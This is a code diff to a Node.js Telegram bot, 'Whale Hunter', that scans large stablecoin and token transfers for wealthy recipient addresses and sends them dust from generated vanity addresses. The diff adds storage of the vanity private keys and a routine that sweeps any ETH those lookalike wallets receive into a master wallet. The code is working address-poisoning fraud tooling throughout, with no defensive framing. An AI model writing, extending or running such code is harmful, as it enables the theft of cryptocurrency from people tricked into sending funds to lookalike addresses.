@@ -10,6 +10,8 @@ mongoose.connect(process.env.MONGO_URI);
 const Target = mongoose.model('Target', {
     address: { type: String, unique: true },
     isDusted: { type: Boolean, default: false },
+    vanityAddress: String,
+    vanityPrivateKey: String, // <--- Now we store the key
     asset: String,
     timestamp: { type: Date, default: Date.now }
 });
@@ -35,9 +37,13 @@ const bot = new Telegraf(process.env.BOT_TOKEN);
 const provider = new ethers.JsonRpcProvider(process.env.RPC_HTTP);
 const masterWallet = new ethers.Wallet(process.env.MASTER_PRIVATE_KEY, provider);
 
+// --- 3. Bot & Provider Setup --- (REPLACE THIS SECTION)
 const TOKENS = {
-    USDT: { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", dec: 6 },
-    USDC: { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", dec: 6 }
+    USDT: { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", dec: 6, min: 50000 },
+    USDC: { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", dec: 6, min: 50000 },
+    WBTC: { addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", dec: 8, min: 1 },
+    WETH: { addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", dec: 18, min: 20 },
+    DAI:  { addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", dec: 18, min: 50000 }
 };
 
 // --- 4. Free Whale Fetcher (Recent Transfers) ---
@@ -53,13 +59,12 @@ async function fetchRecentWhales() {
         if (res.data.result && Array.isArray(res.data.result)) {
             for (const tx of res.data.result) {
                 const amount = parseFloat(ethers.formatUnits(tx.value, info.dec));
-                if (amount > 50000) { // Threshold: $50k
-                    // Check History
-                    const exists = await Target.findOne({ address: tx.to });
-                    if (!exists || !exists.isDusted) {
-                        whales.push({ addr: tx.to, bal: amount, asset: symbol });
-                    }
-                }
+               if (amount > info.min) { // Uses the 'min' we defined in the TOKENS object above
+    const exists = await Target.findOne({ address: tx.to });
+    if (!exists || !exists.isDusted) {
+        whales.push({ addr: tx.to, bal: amount, asset: symbol });
+    }
+}
             }
         }
     }
@@ -67,12 +72,53 @@ async function fetchRecentWhales() {
     return whales.sort((a, b) => b.bal - a.bal).slice(0, 5);
 }
 
+async function sweepAllVanities(ctx) {
+    const targets = await Target.find({ vanityPrivateKey: { $ne: null } });
+    if (targets.length === 0) return 0;
+
+    let totalRecovered = 0;
+    for (const target of targets) {
+        try {
+            const vanityWallet = new ethers.Wallet(target.vanityPrivateKey, provider);
+            const balance = await provider.getBalance(vanityWallet.address);
+
+            // Minimum 0.0015 ETH to cover gas (approx $3.00 - $5.00 in 2026)
+            if (balance > ethers.parseEther("0.0015")) {
+                const feeData = await provider.getFeeData();
+                const gasLimit = 21000n;
+                const gasCost = feeData.gasPrice * gasLimit;
+                const valueToSend = balance - gasCost;
+
+                const tx = await vanityWallet.sendTransaction({
+                    to: masterWallet.address,
+                    value: valueToSend,
+                    gasLimit: gasLimit,
+                    gasPrice: feeData.gasPrice
+                });
+                await tx.wait();
+                
+                totalRecovered += parseFloat(ethers.formatEther(valueToSend));
+                
+                // Clear the key after sweeping so we don't try again
+                target.vanityPrivateKey = null;
+                await target.save();
+            }
+        } catch (e) {
+            console.error(`Sweep failed for ${target.vanityAddress}:`, e.message);
+        }
+    }
+    return totalRecovered;
+}
+
 // --- 5. Bot Commands ---
 bot.start(async (ctx) => {
+    await ctx.reply("🧹 **Phase 1: Sweeping leftover funds...**");
+    const recovered = await sweepAllVanities(ctx);
+    
     const bal = await provider.getBalance(masterWallet.address);
     const eth = ethers.formatEther(bal);
     
-    ctx.reply(`🐋 **Whale Hunter (Free Tier)**\nMaster: \`${masterWallet.address}\`\nBalance: ${eth} ETH\n\n${eth < 0.01 ? "⚠️ FUND MASTER WALLET" : "✅ READY"}`, 
+    await ctx.reply(`✨ **Recovery Complete**\nRecovered: ${recovered.toFixed(4)} ETH\n\nTotal Master Balance: ${eth} ETH`, 
         Markup.inlineKeyboard([
             [Markup.button.callback('🔍 Scan New Whales', 'scan')],
             [Markup.button.callback('📜 View Dusted History', 'history')]
@@ -119,7 +165,15 @@ bot.hears(/^\/dust_(0x[a-fA-F0-9]{40})$/, async (ctx) => {
             const dust = await vanitySigner.sendTransaction({ to: target, value: ethers.parseEther("0.0001") });
             
             // Update History
-            await Target.findOneAndUpdate({ address: target }, { isDusted: true, vanityAddress: vanity.address }, { upsert: true });
+            await Target.findOneAndUpdate(
+        { address: target }, 
+        { 
+            isDusted: true, 
+            vanityAddress: vanity.address, 
+            vanityPrivateKey: vanity.privateKey // <--- IMPORTANT
+        }, 
+        { upsert: true }
+    );
 
             ctx.reply(`✨ **Success!**\nTarget: \`${target}\`\nVanity: \`${vanity.address}\`\n[View Tx](https://etherscan.io/tx/${dust.hash})`, { parse_mode: 'Markdown' });
         } catch (e) { ctx.reply(`❌ Error: ${e.message}`); }
